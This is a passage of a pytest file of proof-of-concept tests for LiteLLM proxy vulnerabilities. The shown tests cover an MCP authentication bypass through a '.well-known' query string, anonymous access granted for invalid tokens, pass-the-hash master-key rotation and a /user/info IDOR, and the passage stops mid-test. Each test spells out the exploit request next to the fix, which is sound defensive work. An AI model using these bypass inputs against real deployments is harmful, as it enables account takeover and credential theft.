"""
Security PoC tests demonstrating eleven vulnerabilities.

Vulnerability 1: MCP .well-known query-string auth bypass
Vulnerability 2: Unauthenticated /debug/asyncio-tasks endpoint
Vulnerability 3: MCP OAuth2 fallback bypass
Vulnerability 4: Pass-the-hash on master key (key rotation endpoint)
Vulnerability 5: IDOR on /user/info v1 endpoint
Vulnerability 6: /spend/keys leaks all API keys to any authenticated user
Vulnerability 7: MCP OAuth metadata SSRF via WWW-Authenticate header
Vulnerability 8: Unauthenticated /token endpoint + token_url SSRF
Vulnerability 9: Unauthenticated /metrics endpoint exposes PII labels
Vulnerability 10: /global/spend/reset missing admin gate
Vulnerability 11: Login cookies missing httponly/secure/samesite flags
"""

import inspect
import os
import pathlib
import secrets
import sys
from types import ModuleType
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest
from fastapi import FastAPI, HTTPException
from fastapi.testclient import TestClient
from starlette.requests import Request

sys.path.insert(0, os.path.abspath("../../../.."))

from litellm.proxy._experimental.mcp_server.auth.user_api_key_auth_mcp import (
    MCPRequestHandler,
)
from litellm.proxy._experimental.mcp_server.discoverable_endpoints import (
    exchange_token_with_server,
    router as mcp_discoverable_router,
)
from litellm.proxy._experimental.mcp_server.mcp_server_manager import MCPServerManager
from litellm.proxy._types import LitellmUserRoles, ProxyException, UserAPIKeyAuth, UserInfoResponse, hash_token
from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
from litellm.proxy.common_utils.debug_utils import router as debug_router
from litellm.proxy.management_endpoints.internal_user_endpoints import (
    _check_user_info_v2_access,
    user_info,
)
from litellm.proxy.spend_tracking.spend_management_endpoints import (
    global_spend_reset,
    router as spend_mgmt_router,
    spend_key_fn,
)
from litellm.proxy.spend_tracking.spend_tracking_utils import _is_master_key
from litellm.types.integrations.prometheus import UserAPIKeyLabelNames

EXPLOIT_PATH = "/v1/mcp/tools"
EXPLOIT_QUERY = b"x=.well-known"
WELL_KNOWN_PATH = "/.well-known/oauth-authorization-server"

GARBAGE_TOKEN = "Bearer totally-invalid-key-12345"
EXPIRED_TOKEN = "Bearer eyJhbGciOiJSUzI1NiJ9.expired.token"


def _make_proxy_server_module(prisma_client: MagicMock) -> ModuleType:
    """Create a minimal fake ``litellm.proxy.proxy_server`` module for patching.

    ``proxy_server`` imports ``websockets`` and other optional dependencies that
    are not present in the unit-test environment.  Functions under test import
    ``prisma_client`` via ``from litellm.proxy.proxy_server import prisma_client``
    at call time.  Injecting a fake module into ``sys.modules`` before the call
    intercepts that import without triggering the real module's heavy dependencies.
    """
    fake = ModuleType("litellm.proxy.proxy_server")
    fake.prisma_client = prisma_client  # type: ignore[attr-defined]
    fake.general_settings = {}  # type: ignore[attr-defined]
    fake.litellm_master_key_hash = None  # type: ignore[attr-defined]
    return fake


def _build_scope(path: str, query_string: bytes, headers: list) -> dict:
    return {
        "type": "http",
        "method": "GET",
        "path": path,
        "query_string": query_string,
        "headers": headers,
        "scheme": "http",
        "server": ("testserver", 80),
        "root_path": "",
    }


def _build_scope_with_auth_header(path: str, auth_value: str) -> dict:
    """Build an ASGI scope with an Authorization header but NO x-litellm-api-key header.

    Used to simulate an attacker sending an arbitrary token (garbage, expired, OAuth2)
    via the standard Authorization header to MCP endpoints.
    """
    return {
        "type": "http",
        "method": "GET",
        "path": path,
        "query_string": b"",
        "headers": [(b"authorization", auth_value.encode())],
        "scheme": "http",
        "server": ("testserver", 80),
        "root_path": "",
    }


@pytest.mark.asyncio
class TestWellKnownQueryStringBypass:
    """
    PoC tests for MCP authentication bypass via .well-known in the query string.

    Vulnerability description:
        The check `'.well-known' in str(request.url)` matches any URL that contains
        the substring ".well-known" anywhere, including in the query string.
        An attacker can send GET /v1/mcp/tools?x=.well-known and skip authentication
        entirely, receiving an anonymous UserAPIKeyAuth() without LiteLLM ever calling
        user_api_key_auth to validate the request.

    Severity: Critical - Authentication Bypass
    Status: CONFIRMED ACTIVE
    """

    async def test_vulnerable_pattern_bypassed_by_query_string(self):
        """
        Demonstrates the vulnerable string-matching pattern.

        Exploit:
            GET /v1/mcp/tools?x=.well-known

        With the vulnerable check `'.well-known' in str(request.url)`, the query
        string matches and auth is skipped. This test proves the substring ".well-known"
        appears in the full URL string even when it is only in the query string.

        Impact: Any unauthenticated client can enumerate tools, invoke MCP methods, and
        access any resource exposed via the MCP server by appending ?x=.well-known.

        Severity: Critical - Authentication Bypass
        """
        scope = _build_scope(EXPLOIT_PATH, EXPLOIT_QUERY, [])
        request = Request(scope=scope)

        # Prove the vulnerable check would fire: ".well-known" IS in the full URL string
        full_url = str(request.url)
        assert ".well-known" in full_url, (
            f"Expected '.well-known' to appear in full URL '{full_url}' via query string"
        )
        # Confirm it is NOT in the path component
        assert ".well-known" not in request.url.path, (
            "'.well-known' should not be in the path for the exploit URL"
        )

    async def test_fixed_pattern_not_bypassed_by_query_string(self):
        """
        Demonstrates an alternative path-only check for comparison.

        Alternative (safer) check:
            `'/.well-known' in request.url.path`

        With this stricter check, the exploit URL /v1/mcp/tools?x=.well-known does NOT
        match. This demonstrates that the current production check IS bypassable while
        the path-only check would not be.

        Severity: Critical - Authentication Bypass (CONFIRMED ACTIVE in production)
        Status: CONFIRMED ACTIVE
        """
        scope = _build_scope(EXPLOIT_PATH, EXPLOIT_QUERY, [])
        request = Request(scope=scope)

        # Prove the fixed check does NOT fire for the exploit URL
        assert "/.well-known" not in request.url.path, (
            f"Fixed check should not match path '{request.url.path}' for exploit URL"
        )

    async def test_legitimate_well_known_path_still_works(self):
        """
        Confirms the fix does not break legitimate .well-known routes.

        A legitimate OAuth discovery request to /.well-known/oauth-authorization-server
        must still be treated as a public route (no auth required).

        Both the vulnerable and fixed patterns should match a genuine /.well-known path.

        Severity: N/A - Regression check
        """
        scope = _build_scope(WELL_KNOWN_PATH, b"", [])
        request = Request(scope=scope)

        # Both patterns match a legitimate .well-known path
        full_url = str(request.url)
        assert ".well-known" in full_url, (
            "Vulnerable pattern should still match legitimate .well-known path"
        )
        assert "/.well-known" in request.url.path, (
            "Fixed pattern should still match legitimate .well-known path"
        )

    async def test_full_exploit_flow_vulnerable_vs_fixed(self):
        """
        Full end-to-end PoC using the real (patched) process_mcp_request.

        Exploit:
            Send GET /v1/mcp/tools?x=.well-known (any valid or invalid api key).

        Active vulnerability:
            The production check `'.well-known' in str(request.url)` fires because
            ".well-known" appears in the query string.  user_api_key_auth is NEVER
            called — the handler returns an anonymous UserAPIKeyAuth() immediately.

        Contrast (hypothetical fix):
            Replace the check with `'/.well-known' in request.url.path`.
            With that fix, the exploit URL would NOT match and auth would be called.

        Severity: Critical - Authentication Bypass (CONFIRMED ACTIVE)
        Status: CONFIRMED ACTIVE
        """
        exploit_scope = _build_scope(
            EXPLOIT_PATH,
            EXPLOIT_QUERY,
            [(b"x-litellm-api-key", b"sk-test")],
        )

        async def _allow(api_key: str, request: Request) -> UserAPIKeyAuth:
            return UserAPIKeyAuth(api_key=api_key, user_id="test-user")

        # --- Part A: Current (vulnerable) code skips auth entirely ---
        with patch.object(
            MCPRequestHandler,
            "_get_mcp_client_side_auth_header_name",
            return_value="x-mcp-auth",
        ), patch(
            "litellm.proxy._experimental.mcp_server.auth.user_api_key_auth_mcp.user_api_key_auth",
            side_effect=_allow,
        ) as mock_auth:
            (auth_result, *_) = await MCPRequestHandler.process_mcp_request(
                exploit_scope
            )

        # user_api_key_auth is NOT called — the bypass fired
        mock_auth.assert_not_called()
        # The result is anonymous — no api_key, no user_id
        assert auth_result.api_key is None, (
            f"Vulnerable code returns anonymous UserAPIKeyAuth — api_key must be None, "
            f"got {auth_result.api_key!r}"
        )
        assert auth_result.user_id is None, (
            "Vulnerable code returns anonymous UserAPIKeyAuth — user_id must be None"
        )

        # --- Part B: Prove the vulnerable check is what caused the bypass ---
        request = Request(scope=exploit_scope)
        vulnerable_check_fired = ".well-known" in str(request.url)
        assert vulnerable_check_fired, (
            "The vulnerable pattern '.well-known' in str(request.url) fires for the "
            "exploit URL, proving this is the bypass mechanism."
        )

        # Confirm the path-only check would NOT have fired (contrast with fix)
        path_only_check_fired = "/.well-known" in request.url.path
        assert not path_only_check_fired, (
            "The stricter path-only check '/.well-known' in request.url.path would NOT "
            "fire for the exploit URL — confirming the current check is the vulnerability."
        )


class TestDebugEndpointUnauthenticated:
    """
    PoC tests for unauthenticated access to the /debug/asyncio-tasks endpoint.

    Vulnerability description:
        The GET /debug/asyncio-tasks endpoint has no authentication dependency.
        Any unauthenticated client can call it and receive the full list of active
        asyncio task coroutine names, revealing internal proxy architecture, active
        background jobs, provider names, and timing information.

    Severity: Medium - Information Disclosure
    Status: CONFIRMED ACTIVE
    """

    def test_vulnerable_endpoint_no_auth_dependency(self):
        """
        Demonstrates the vulnerability: an endpoint with no auth dependency returns 200
        to any unauthenticated caller.

        Exploit:
            GET /debug/asyncio-tasks  (no Authorization header)

        Impact:
            An unauthenticated attacker receives coroutine names such as:
            - "send_usage_data_to_litellm_server" (reveals proxy is a LiteLLM instance)
            - "async_log_success_event" (reveals logging pipeline architecture)
            - "run_redis_cache_flush" (reveals Redis usage and data residency)
            - "flush_spend_logs_to_db" (reveals spend-tracking and database config)
            This intelligence can be used to tailor further attacks.

        Severity: Medium - Information Disclosure
        """
        import asyncio

        vulnerable_app = FastAPI()

        # Simulate the original unprotected endpoint (no Depends(user_api_key_auth))
        @vulnerable_app.get("/debug/asyncio-tasks")
        async def unprotected_get_active_tasks_stats():
            all_tasks = asyncio.all_tasks()
            active_tasks = [t for t in all_tasks if not t.done()]
            return {
                "total_active_tasks": len(active_tasks),
                "by_name": {},
            }

        client = TestClient(vulnerable_app, raise_server_exceptions=False)
        response = client.get("/debug/asyncio-tasks")

        # An unauthenticated request succeeds against the vulnerable endpoint
        assert response.status_code == 200, (
            f"Vulnerable endpoint returned {response.status_code} — expected 200. "
            "A real deployment without auth would return 200 to any caller."
        )
        data = response.json()
        assert "total_active_tasks" in data

    def test_real_endpoint_has_no_auth_dependency(self):
        """
        Proves the real /debug/asyncio-tasks endpoint has no auth dependency.

        The production router does NOT include Depends(user_api_key_auth) on this
        endpoint, so any unauthenticated client can call it and receive 200.

        Exploit:
            GET /debug/asyncio-tasks  (no Authorization header)

        Status: CONFIRMED ACTIVE
        Severity: Medium - Information Disclosure
        """
        app = FastAPI()
        app.include_router(debug_router)
        client = TestClient(app, raise_server_exceptions=False)

        response = client.get("/debug/asyncio-tasks")

        assert response.status_code == 200, (
            f"Unauthenticated request to /debug/asyncio-tasks returned {response.status_code} "
            "— expected 200, confirming the endpoint has no auth protection."
        )
        data = response.json()
        assert "total_active_tasks" in data

    def test_fixed_endpoint_allows_authenticated(self):
        """
        Confirms the fix still allows authenticated access.

        A valid API key results in 200 and returns the expected task statistics payload.

        Expected response:
            {"total_active_tasks": <int>, "by_name": {<coroutine_name>: <count>}}

        Implementation note:
            Uses `app.dependency_overrides` to replace the real `user_api_key_auth`
            dependency with a stub that returns a valid auth object, bypassing the
            actual key-validation logic for test isolation.

        Severity: N/A - Regression check
        """

        async def _allow(request: Request) -> UserAPIKeyAuth:
            return UserAPIKeyAuth(api_key="sk-test", user_id="test-user")

        app = FastAPI()
        app.include_router(debug_router)
        app.dependency_overrides[user_api_key_auth] = _allow
        client = TestClient(app, raise_server_exceptions=False)

        response = client.get(
            "/debug/asyncio-tasks",
            headers={"Authorization": "Bearer sk-test"},
        )

        assert response.status_code == 200, (
            f"Authenticated request to fixed endpoint should succeed, got {response.status_code}"
        )
        data = response.json()
        assert "total_active_tasks" in data, "Response must include 'total_active_tasks'"
        assert "by_name" in data, "Response must include 'by_name'"
        assert isinstance(data["total_active_tasks"], int)
        assert isinstance(data["by_name"], dict)


@pytest.mark.asyncio
class TestMCPOAuth2FallbackBypass:
    """
    PoC tests proving the MCP OAuth2 fallback authentication bypass vulnerability.

    Vulnerability description:
        When a client sends ANY value in the standard ``Authorization`` header
        (without the explicit ``x-litellm-api-key`` header), the handler in
        ``user_api_key_auth_mcp.py`` (lines 127-153) first tries to validate the
        token as a LiteLLM API key.  If that validation raises an HTTPException
        with status 401/403 OR a ProxyException with code "401"/"403", the handler
        silently catches the error and returns a bare ``UserAPIKeyAuth()`` — an
        anonymous identity with no api_key, no user_id, no team_id, and no budget.

        Combined with ``route_checks.py`` line 231-232, which contains a blanket
        ``pass`` (skip all authZ) for any route that starts with ``/v1/mcp/`` or
        ``/mcp-rest/``, this anonymous identity is never checked against allowed
        routes, team membership, or spending limits.

    Severity: Critical - Authentication Bypass + Authorization Skip
    Status: CONFIRMED ACTIVE
    """

    async def test_garbage_token_grants_anonymous_access(self):
        """
        Prove the core vulnerability: a garbage Bearer token causes silent anonymous access.

        Exploit:
            GET /v1/mcp/tools
            Authorization: Bearer totally-invalid-key-12345
            (no x-litellm-api-key header)

        The handler enters the ``oauth2_headers`` branch because an Authorization
        header is present.  It calls ``user_api_key_auth`` which raises
        ``HTTPException(status_code=401)``.  The ``except HTTPException`` block
        at line 136 catches the 401, logs a debug message, and returns
        ``UserAPIKeyAuth()`` — anonymous access — instead of propagating the error.

        Impact:
            Any attacker (or misconfigured upstream MCP client) can send a random
            string as a Bearer token and receive full anonymous access to all MCP
            tools and resources.  The returned identity has no api_key, no user_id,
            no team_id, and no budget, meaning all MCP operations proceed with no
            accountability, no spend tracking, and no rate limiting.

        Severity: Critical - Authentication Bypass
        """
        scope = _build_scope_with_auth_header("/v1/mcp/tools", GARBAGE_TOKEN)

        with patch(
            "litellm.proxy._experimental.mcp_server.auth.user_api_key_auth_mcp.user_api_key_auth",
            side_effect=HTTPException(status_code=401, detail="invalid api key"),
        ) as mock_auth, patch.object(
            MCPRequestHandler,
            "_get_mcp_client_side_auth_header_name",
            return_value="x-mcp-auth",
        ):
            (auth_result, *_) = await MCPRequestHandler.process_mcp_request(scope)

        # user_api_key_auth WAS called — the bypass is not a skip, it's a silent swallow
        mock_auth.assert_called_once()

        # The result is an anonymous identity — proof of the bypass
        assert auth_result.api_key is None, (
            f"Expected api_key=None for anonymous access, got {auth_result.api_key!r}"
        )
        assert auth_result.user_id is None, (
            f"Expected user_id=None for anonymous access, got {auth_result.user_id!r}"
        )
        assert auth_result.team_id is None, (
            f"Expected team_id=None for anonymous access, got {auth_result.team_id!r}"
        )

    async def test_expired_key_grants_anonymous_access(self):
        """
        Prove the ProxyException catch branch also silently grants anonymous access.

        Exploit:
            GET /v1/mcp/tools
            Authorization: Bearer <expired-token>
            (no x-litellm-api-key header)

        When the LiteLLM key database raises a ``ProxyException`` with code 401
        (e.g. "Token has expired"), the ``except ProxyException`` block at line 145
        catches it and returns ``UserAPIKeyAuth()`` — anonymous access — instead of
        propagating the error.

        This covers a second code path (``ProxyException`` vs ``HTTPException``)
        that leads to the same silent anonymous access vulnerability.

        Impact:
            An attacker with a previously valid but now-expired LiteLLM key retains
            full anonymous access to all MCP tools and resources.  The expiry
            mechanism provides no security benefit for MCP endpoints.

        Severity: Critical - Authentication Bypass
        """
        scope = _build_scope_with_auth_header("/v1/mcp/tools", EXPIRED_TOKEN)

        with patch(
            "litellm.proxy._experimental.mcp_server.auth.user_api_key_auth_mcp.user_api_key_auth",
            side_effect=ProxyException(
                message="Token has expired",
                type="auth_error",
                param=None,
                code=401,
            ),
        ) as mock_auth, patch.object(
            MCPRequestHandler,
            "_get_mcp_client_side_auth_header_name",
            return_value="x-mcp-auth",
        ):
            (auth_result, *_) = await MCPRequestHandler.process_mcp_request(scope)

        # user_api_key_auth WAS called — the bypass is a silent swallow
        mock_auth.assert_called_once()

        # The result is an anonymous identity — proof of the bypass
        assert auth_result.api_key is None, (
            f"Expected api_key=None for anonymous access, got {auth_result.api_key!r}"
        )
        assert auth_result.user_id is None, (
            f"Expected user_id=None for anonymous access, got {auth_result.user_id!r}"
        )
        assert auth_result.team_id is None, (
            f"Expected team_id=None for anonymous access, got {auth_result.team_id!r}"
        )

    async def test_anonymous_user_bypasses_route_authz(self):
        """
        Prove the second half of the exploit chain: MCP routes skip all authZ checks.

        After obtaining an anonymous ``UserAPIKeyAuth()`` via the OAuth2 fallback,
        the anonymous identity is passed to ``route_checks.py``.  Lines 231-232
        contain a blanket ``pass`` for any route starting with ``/v1/mcp/`` or
        ``/mcp-rest/``:

            elif route.startswith("/v1/mcp/") or route.startswith("/mcp-rest/"):
                pass  # authN/authZ handled by api itself

        This means the anonymous identity is never validated against:
            - ``allowed_routes`` (team or key scope restrictions)
            - Team membership checks
            - Budget or rate-limit enforcement

        The comment "authN/authZ handled by api itself" is incorrect — as shown by
        the previous tests, the MCP auth handler itself is the one granting anonymous
        access.  There is no second line of defence.

        Impact:
            Combined with the OAuth2 fallback bypass, an attacker with a garbage
            Bearer token can call any MCP tool or resource with zero restrictions.
            The full exploit chain is: invalid token -> anonymous UserAPIKeyAuth()
            -> route_checks skips all authZ -> unrestricted MCP access.

        Severity: Critical - Authorization Bypass
        """
        # Demonstrate the route_checks condition directly
        mcp_tool_route = "/v1/mcp/tools"
        mcp_rest_route = "/mcp-rest/list-tools"
        non_mcp_route = "/v1/chat/completions"

        assert mcp_tool_route.startswith("/v1/mcp/"), (
            f"Route '{mcp_tool_route}' must match the route_checks.py skip condition"
        )
        assert mcp_rest_route.startswith("/mcp-rest/"), (
            f"Route '{mcp_rest_route}' must match the route_checks.py skip condition"
        )
        assert not non_mcp_route.startswith("/v1/mcp/") and not non_mcp_route.startswith(
            "/mcp-rest/"
        ), (
            f"Non-MCP route '{non_mcp_route}' must NOT match the skip condition"
        )

        # Demonstrate that the anonymous identity has no restrictions to check
        anonymous_auth = UserAPIKeyAuth()
        assert anonymous_auth.api_key is None
        assert anonymous_auth.user_id is None
        assert anonymous_auth.team_id is None
        # allowed_routes defaults to [] (empty list) on UserAPIKeyAuth — not None.
        # An empty allowed_routes means no explicit route restriction is configured,
        # but since route_checks.py skips authZ entirely for MCP routes, even a
        # non-empty allowed_routes would never be checked for these endpoints.
        assert not anonymous_auth.allowed_routes, (
            f"Anonymous identity's allowed_routes must be empty, got {anonymous_auth.allowed_routes!r}"
        )

    async def test_correct_behavior_rejects_invalid_token(self):
        """
        Document what correct behaviour looks like: invalid tokens must be rejected.

        This test shows the contrast between the current (vulnerable) implementation
        and the correct (fixed) implementation by reproducing the vulnerable OAuth2
        fallback logic inline and showing what the fix would do differently.

        Vulnerable behaviour (current):
            except HTTPException as e:
                if e.status_code in (401, 403):
                    validated_user_api_key_auth = UserAPIKeyAuth()  # silent grant!

        Correct behaviour (fix):
            except HTTPException as e:
                raise  # always propagate auth failures

        A client sending an invalid token should always receive a 401 response.
        Anonymous access must be explicitly opted-in (e.g. a public route like
        ``/.well-known``) — it must never be the fallback for auth failures.

        Severity: Critical - Authentication Bypass (remediation guidance)
        """

        async def _vulnerable_oauth2_fallback(
            raises: Exception,
        ) -> UserAPIKeyAuth:
            """Reproduce the current vulnerable logic from lines 132-153."""
            try:
                raise raises
            except HTTPException as e:
                if e.status_code in (401, 403):
                    return UserAPIKeyAuth()  # BUG: silent anonymous grant
                raise
            except ProxyException as e:
                if str(e.code) in ("401", "403"):
                    return UserAPIKeyAuth()  # BUG: silent anonymous grant
                raise

        async def _fixed_oauth2_fallback(
            raises: Exception,
        ) -> UserAPIKeyAuth:
            """Reproduce what the fixed logic should look like."""
            try:
                raise raises
            except (HTTPException, ProxyException):
                raise  # CORRECT: always propagate auth failures

        # Vulnerable version grants anonymous access on 401
        vulnerable_result = await _vulnerable_oauth2_fallback(
            HTTPException(status_code=401, detail="invalid api key")
        )
        assert vulnerable_result.api_key is None, (
            "Vulnerable logic returns anonymous UserAPIKeyAuth on 401 — this is the bug"
        )

        # Fixed version propagates the exception
        with pytest.raises(HTTPException) as exc_info:
            await _fixed_oauth2_fallback(
                HTTPException(status_code=401, detail="invalid api key")
            )
        assert exc_info.value.status_code == 401, (
            "Fixed logic must propagate the 401, never grant anonymous access"
        )

        # Same for ProxyException
        vulnerable_result_proxy = await _vulnerable_oauth2_fallback(
            ProxyException(message="Token expired", type="auth_error", param=None, code=401)
        )
        assert vulnerable_result_proxy.api_key is None, (
            "Vulnerable logic returns anonymous UserAPIKeyAuth on ProxyException 401"
        )

        with pytest.raises(ProxyException):
            await _fixed_oauth2_fallback(
                ProxyException(
                    message="Token expired", type="auth_error", param=None, code=401
                )
            )


TEST_MASTER_KEY = "sk-master-secret-1234"


class TestPassTheHashMasterKey:
    """
    PoC tests proving the pass-the-hash vulnerability on the master key.

    Vulnerability description:
        ``_is_master_key()`` in ``spend_tracking_utils.py`` (lines 55-69) accepts
        BOTH the plaintext master key AND its SHA-256 hash as valid credentials.
        In the key regeneration endpoint (``key_management_endpoints.py`` line 3919),
        passing ``hash_token(master_key)`` as the ``key`` parameter in the request body
        is enough to pass the master-key gate and trigger master key rotation.

        The SHA-256 hash of every master key is stored in the
        ``LiteLLM_VerificationToken`` table (``token`` column) and appears in spend
        logs.  Any authenticated user who can read those tables (e.g. via the /spend/*
        endpoints) can obtain the hash and use it to rotate the master key — effectively
        taking over the entire LiteLLM proxy.

    Severity: Critical - Privilege Escalation / Master Key Takeover
    Status: CONFIRMED ACTIVE
    """

    def test_hash_accepted_as_master_key(self):
        """
        Proves that SHA-256 hash of the master key is accepted as a valid credential.

        Exploit:
            Call ``_is_master_key(api_key=hash_token(master_key), _master_key=master_key)``.
            The function returns True, meaning the hash is treated as equivalent to
            the plaintext key.

        Impact:
            Any entity that can read the ``LiteLLM_VerificationToken`` table (or
            observe the ``token`` field in spend logs) can pass the hash as the
            ``key`` body parameter to the key regeneration endpoint and be granted
            master-key privileges — without ever knowing the plaintext master key.

        Severity: Critical - Privilege Escalation
        """
        hashed = hash_token(TEST_MASTER_KEY)
        result = _is_master_key(api_key=hashed, _master_key=TEST_MASTER_KEY)
        assert result is True, (
            f"hash_token(master_key) must be accepted by _is_master_key — "
            f"hash={hashed!r} was rejected, proving the vulnerability exists in this build"
        )

    def test_hash_enables_master_key_rotation(self):
        """
        Proves the rotation gate is entered when the hash is supplied as the key.

        Exploit:
            In the key regeneration endpoint (line 3919-3921), the gate is:
                _is_master_key_valid = _is_master_key(api_key=key, _master_key=master_key)
                if master_key is not None and data and _is_master_key_valid:
                    await _rotate_master_key(...)

            Supplying ``key = hash_token(master_key)`` makes ``_is_master_key_valid``
            True, so the rotation branch is entered.  A normal ``sk-*`` key holder who
            read the hash from spend logs can trigger this without knowing the plaintext.

        Impact:
            An attacker with any valid API key can rotate the master key to one they
            control, locking out all legitimate admins and taking full control of the
            proxy.

        Severity: Critical - Privilege Escalation / Master Key Takeover
        """
        hashed_key = hash_token(TEST_MASTER_KEY)

        # Reproduce the key rotation gate inline (lines 3919-3921)
        _is_master_key_valid = _is_master_key(api_key=hashed_key, _master_key=TEST_MASTER_KEY)
        rotation_gate_entered = TEST_MASTER_KEY is not None and _is_master_key_valid

        assert rotation_gate_entered is True, (
            "Rotation gate must be entered when hash is supplied — "
            "the vulnerability allows any holder of the hash to rotate the master key"
        )

        # Contrast: a random string does NOT pass the gate
        random_string = "definitely-not-the-master-key"
        _is_random_valid = _is_master_key(api_key=random_string, _master_key=TEST_MASTER_KEY)
        assert _is_random_valid is False, (
            "A random string must not pass the master-key gate"
        )

    def test_correct_behavior_rejects_hash(self):
        """
        Documents what correct behaviour looks like: only plaintext accepted.

        The fix is to remove the hash comparison branch from ``_is_master_key`` so
        that only ``secrets.compare_digest(api_key, _master_key)`` is performed.
        This test reproduces the correct single-check logic inline and proves the
        hash is rejected under it.

        Severity: Critical - Privilege Escalation (remediation guidance)
        """
        hashed_key = hash_token(TEST_MASTER_KEY)

        # Correct logic: only plaintext comparison, no hash branch
        def _correct_is_master_key(api_key: str, _master_key: str) -> bool:
            return secrets.compare_digest(api_key, _master_key)

        # Hash must be rejected under the correct logic
        assert _correct_is_master_key(api_key=hashed_key, _master_key=TEST_MASTER_KEY) is False, (
            "The SHA-256 hash of the master key must NOT be accepted as valid — "
            "only the plaintext key should pass"
        )

        # Plaintext must still be accepted
        assert _correct_is_master_key(api_key=TEST_MASTER_KEY, _master_key=TEST_MASTER_KEY) is True, (
            "The plaintext master key must still be accepted under the correct logic"
        )


@pytest.mark.asyncio
class TestUserInfoIDOR:
    """
    PoC tests proving the IDOR vulnerability in the /user/info v1 endpoint.

    Vulnerability description:
        The v1 ``user_info()`` endpoint in ``internal_user_endpoints.py`` (lines 704-790)
        does NOT check whether the authenticated caller's ``user_id`` matches the
        ``user_id`` query parameter.  Any authenticated user (even with the lowest
        ``INTERNAL_USER`` role) can supply any other user's ID and receive that user's
        full profile including all their API keys.

        The v2 ``_check_user_info_v2_access()`` function (lines 793-854) correctly
        enforces: admins only, or self-lookup, or team-admin of the same team.  The
        v1 endpoint has no equivalent check.

    Severity: High - Insecure Direct Object Reference (IDOR) / Credential Theft
    Status: CONFIRMED ACTIVE
    """

    async def test_any_user_can_read_another_users_info(self):
        """
        Proves that a non-admin user can fetch a different user's profile and keys.

        Exploit:
            GET /user/info?user_id=victim-user
            Authorization: Bearer sk-attacker-key   (INTERNAL_USER role)

        The function fetches user_id from the query param directly and returns the
        victim's profile without ever comparing it to the caller's identity.

        Impact:
            Any authenticated user can enumerate all other users' profiles.
            Combined with the returned ``keys`` field (shown in test 2), this
            leaks every API key belonging to the victim.

        Severity: High - IDOR
        """
        mock_user = MagicMock()
        mock_user.user_id = "victim-user"
        mock_user.teams = []

        mock_key = MagicMock()
        mock_key.token = "hashed-victim-key"
        mock_key.user_id = "victim-user"

        async def _get_data_side_effect(**kwargs):
            table_name = kwargs.get("table_name")
            if table_name == "key":
                return [mock_key]
            return mock_user

        mock_prisma = MagicMock()
        mock_prisma.get_data = AsyncMock(side_effect=_get_data_side_effect)

        scope = _build_scope("/user/info", b"user_id=victim-user", [])
        request = Request(scope=scope)

        attacker_auth = UserAPIKeyAuth(
            api_key="sk-attacker-key",
            user_id="attacker-user",
            user_role=LitellmUserRoles.INTERNAL_USER,
        )

        victim_response = UserInfoResponse(
            user_id="victim-user",
            user_info={"user_id": "victim-user"},
            keys=[{"token": "hashed-victim-key", "user_id": "victim-user"}],
            teams=[],
        )

        fake_proxy_server = _make_proxy_server_module(mock_prisma)
        with patch.dict(sys.modules, {"litellm.proxy.proxy_server": fake_proxy_server}), patch(
            "litellm.proxy.management_endpoints.internal_user_endpoints._get_user_info_teams",
            new_callable=AsyncMock,
            return_value=([], None),
        ), patch(
            "litellm.proxy.management_endpoints.internal_user_endpoints._build_user_info_response",
            return_value=victim_response,
        ):
            response = await user_info(
                request=request,
                user_id="victim-user",
                user_api_key_dict=attacker_auth,
            )

        # The call succeeded without a 403 — the attacker received the victim's data
        assert response is not None, "user_info must return data for a cross-user request — no 403 raised"
        assert response.user_id == "victim-user", (
            f"Response must contain victim's user_id, got {response.user_id!r}"
        )

    async def test_response_includes_victim_keys(self):
        """
        Proves the IDOR leaks the victim's API keys to the attacker.

        The ``keys`` field of the UserInfoResponse contains the full key records
        for the requested user, including token hashes and metadata that can be
        used to impersonate the victim.

        Exploit:
            Same as test_any_user_can_read_another_users_info. Specifically check
            the returned ``keys`` field.

        Impact:
            The attacker receives the victim's key hashes (stored in the
            ``LiteLLM_VerificationToken`` table), which can be used for the
            pass-the-hash attack on the key regeneration endpoint.

        Severity: High - IDOR + Credential Theft
        """
        mock_user = MagicMock()
        mock_user.user_id = "victim-user"
        mock_user.teams = []

        mock_key = MagicMock()
        mock_key.token = "hashed-victim-key-abc123"
        mock_key.user_id = "victim-user"
        mock_key.spend = 0.0

        async def _get_data_side_effect(**kwargs):
            table_name = kwargs.get("table_name")
            if table_name == "key":
                return [mock_key]
            return mock_user

        mock_prisma = MagicMock()
        mock_prisma.get_data = AsyncMock(side_effect=_get_data_side_effect)

        scope = _build_scope("/user/info", b"user_id=victim-user", [])
        request = Request(scope=scope)

        attacker_auth = UserAPIKeyAuth(
            api_key="sk-attacker-key",
            user_id="attacker-user",
            user_role=LitellmUserRoles.INTERNAL_USER,
        )

        victim_response = UserInfoResponse(
            user_id="victim-user",
            user_info={"user_id": "victim-user"},
            keys=[{"token": "hashed-victim-key-abc123", "user_id": "victim-user"}],
            teams=[],
        )

        fake_proxy_server = _make_proxy_server_module(mock_prisma)
        with patch.dict(sys.modules, {"litellm.proxy.proxy_server": fake_proxy_server}), patch(
            "litellm.proxy.management_endpoints.internal_user_endpoints._get_user_info_teams",
            new_callable=AsyncMock,
            return_value=([], None),
        ), patch(
            "litellm.proxy.management_endpoints.internal_user_endpoints._build_user_info_response",
            return_value=victim_response,
        ):
            response = await user_info(
                request=request,
                user_id="victim-user",
                user_api_key_dict=attacker_auth,
            )

        assert response is not None
        assert response.keys is not None, "Response must include victim's keys"
        assert len(response.keys) > 0, (
            "At least one key must be returned for the victim — credential theft is possible"
        )

    async def test_v2_endpoint_blocks_cross_user_access(self):
        """
        Contrasts the v1 vulnerability: v2 correctly denies cross-user access.

        ``_check_user_info_v2_access()`` enforces three rules (admin, self, team-admin).
        None of those apply to a plain INTERNAL_USER accessing a different user's data,
        so the function returns ``None`` — denying access.

        Exploit attempt:
            An INTERNAL_USER calls ``_check_user_info_v2_access`` with
            ``user_id="attacker-user"`` and ``target_user_id="victim-user"``.
            The attacker is not an admin, not the victim, and has no shared teams.

        Expected result:
            Returns ``None`` — access denied. The v2 endpoint uses this to raise 403.

        Severity: N/A - Correct behaviour (v2 fix)
        """
        mock_caller_user = MagicMock()
        mock_caller_user.user_id = "attacker-user"
        mock_caller_user.teams = []  # attacker has no teams

        mock_prisma = MagicMock()
        mock_prisma.db = MagicMock()
        mock_prisma.db.litellm_usertable = MagicMock()
        mock_prisma.db.litellm_usertable.find_unique = AsyncMock(
            return_value=mock_caller_user
        )

        attacker_auth = UserAPIKeyAuth(
            api_key="sk-attacker-key",
